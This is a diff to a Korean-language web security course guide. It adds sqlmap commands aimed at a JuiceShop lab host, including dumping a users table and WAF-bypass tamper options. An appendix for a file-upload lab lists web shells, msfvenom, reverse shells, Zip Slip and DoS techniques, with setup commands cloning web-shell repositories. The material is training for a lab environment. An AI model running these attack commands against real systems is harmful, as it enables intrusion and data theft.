@@ -127,6 +127,34 @@ SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에
 
 ### 2.1 기본 SQLi 공격 (Classic)
 
+> **OSS 도구 — sqlmap (SQLi 점검 표준)**: 본 섹션의 curl 수동 페이로드는 학습용. 실제 점검은 **sqlmap** 으로 자동화한다.
+>
+> ```bash
+> # 설치 (이미 설치됨)
+> sudo apt install sqlmap
+>
+> # 1) 가장 단순 — URL 자동 점검
+> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch
+>
+> # 2) JSON POST body — JuiceShop 로그인 점검
+> sqlmap -u http://10.20.30.80:3000/rest/user/login \
+>   --method=POST --data='{"email":"x","password":"x"}' \
+>   --headers='Content-Type: application/json' \
+>   -p email --batch --level=5 --risk=3
+>
+> # 3) 발견된 SQLi 자동 활용 — DB 스키마 dump
+> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --dbs            # 데이터베이스 목록
+> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch -D Users --tables   # 테이블
+> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch -D Users -T users --dump  # 데이터 dump
+>
+> # 4) WAF 우회 옵션
+> sqlmap -u "..." --batch --tamper=between,space2comment,charunicodeencode --level=5 --risk=3
+> ```
+>
+> sqlmap 의 강점: (1) Classic/Blind/Time-based/Union 4가지 기법을 자동 시도, (2) DB 종류 자동 식별 (SQLite/MySQL/PostgreSQL/Oracle/MSSQL), (3) 발견 시 즉시 데이터 추출까지 한 명령으로 완료.
+
+
+
 > **실습 목적**: SQL Injection 취약점을 체계적으로 점검하고 공격 가능성을 증명한다
 >
 > **배우는 것**: Classic SQLi, Blind SQLi, Union-based SQLi 등 다양한 기법으로 입력값 검증 우회를 시도하는 방법을 배운다
@@ -591,3 +619,37 @@ cursor.execute("SELECT * FROM users WHERE email=?", (email,))
 3. 룰셋 1220/1000 (WAF vendor signature) 의 *SQLi 커버리지* 표 — vendor doc 참조 → 미커버 pattern (예: NoSQL injection·LDAP injection) 별도 점검
 
 
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (lab week05 — 파일 업로드)
+
+| step | 카테고리 | 핵심 도구 |
+|---|---|---|
+| 1 식별 | curl + grep file input / **gobuster -p upload** / Burp Spider / nuclei -tags upload |
+| 2 허용 유형 | form accept / curl 다양 확장자 / **SecLists** / Burp Intruder fuzzing |
+| 3 이중 확장자 | 5 패턴 (이중/역순/null/case/변형) / 서버별 파싱표 / **Burp + PayloadsAllTheThings** / wfuzz |
+| 4 Content-Type | curl -F type= / Burp Repeater multipart / Python requests / 변조 변형표 |
+| 5 매직 바이트 | magic byte 표 / printf 결합 / **exiftool comment** / polyglot |
+| 6 웹쉘 | 1줄 PHP / **weevely** / **p0wny-shell** / **b374k** / **msfvenom** / 다언어 표 |
+| 7 이미지 코드 | exiftool / **steghide** / polyglot (GIFAR/JPG+ZIP/SVG) / GIF-PHP / ImageTragick |
+| 8 ZIP | **evilarc Zip Slip** / 수동 zip / Zip Bomb DoS / symlink / JAR Tomcat |
+| 9 경로 추측 | 경로 패턴 표 / gobuster / ffuf / 응답 분석 / 정상 이미지 URL |
+| 10 RCE 검증 | curl ?c=cmd / weevely / **msfconsole handler** / netcat reverse / linpeas |
+| 11 크기 제한 | dd 다양 / **Content-Length 변조** / chunked encoding / Slowloris DoS |
+| 12 권한 | ls -la + getfacl / Apache .htaccess / Nginx location / **noexec mount** |
+| 13 안전 구현 | **7층 방어** / python-magic / **ClamAV** / **ImageMagick re-encode** / S3 boto3 |
+| 14 모니터링 | **Wazuh FIM** / auditd / **inotifywait + clamscan** / ModSecurity / **Falco** / VirusTotal API |
+| 15 verification | 자동 보고서 / 위험도 표 / 도구 list / sha256 |
+
+### 학생 환경 준비
+```bash
+sudo apt install -y weevely msfvenom exiftool steghide clamav clamav-daemon \
+                    inotify-tools auditd python3-magic
+git clone --depth 1 https://github.com/ptoomey3/evilarc ~/evilarc
+git clone --depth 1 https://github.com/flozz/p0wny-shell ~/p0wny
+git clone --depth 1 https://github.com/b374k/b374k ~/b374k
+# Falco: docker run -d --name falco falcosecurity/falco
+# imagemagick: sudo apt install imagemagick (re-encode 용)
+```
